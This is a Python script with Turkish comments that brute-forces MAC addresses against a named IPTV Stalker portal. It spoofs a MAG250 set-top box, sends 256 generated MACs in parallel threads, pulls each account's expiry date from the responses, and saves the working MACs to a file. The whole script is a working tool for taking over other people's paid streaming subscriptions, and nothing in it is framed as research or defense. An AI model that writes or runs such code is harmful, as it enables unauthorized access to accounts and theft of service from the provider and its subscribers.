import requests
import concurrent.futures
import re # Tarihi ayıklamak için

portal_url = "http://dm.lion-ott.com/c/"

def mac_ureticisi():
    liste = []
    base = "00:1A:79:7C:6B"
    for i in range(256):
        son = hex(i)[2:].zfill(2).upper()
        liste.append(f"{base}:{son}")
    return liste

def tarih_bul(mac):
    headers = {
        'User-Agent': 'MAG250',
        'X-User-Agent': 'Model: MAG250; SW: 2.14.03-r6',
        'Cookie': f'mac={mac};'
    }
    try:
        # API üzerinden profil bilgilerini istiyoruz
        api_url = f"http://dm.lion-ott.com/portal.php?type=account_info&action=get_main_info"
        response = requests.get(api_url, headers=headers, timeout=10)
        
        if response.status_code == 200:
            data = response.text
            # Yanıt içinde "exp_date" veya tarih formatı arıyoruz
            tarih_match = re.search(r'\d{4}-\d{2}-\d{2}', data)
            tarih = tarih_match.group(0) if tarih_match else "Bilinmiyor"
            return f"{mac} | Bitiş: {tarih}"
        return None
    except:
        return None

def baslat():
    denenecekler = mac_ureticisi()
    print(f"🚀 {len(denenecekler)} adres taranıyor ve tarihler kontrol ediliyor...")
    
    sonuclar = []
    with concurrent.futures.ThreadPoolExecutor(max_workers=25) as executor:
        kontroller = list(executor.map(tarih_bul, denenecekler))
        sonuclar = [s for s in kontroller if s]

    if sonuclar:
        with open("calisan_maclar.txt", "w") as f: # Dosyayı temizleyip yeniden yazar
            for s in sonuclar:
                f.write(f"{portal_url} | {s}\n")
        print(f"✅ {len(sonuclar)} aktif adres ve tarihleri kaydedildi.")

if __name__ == "__main__":
    baslat()
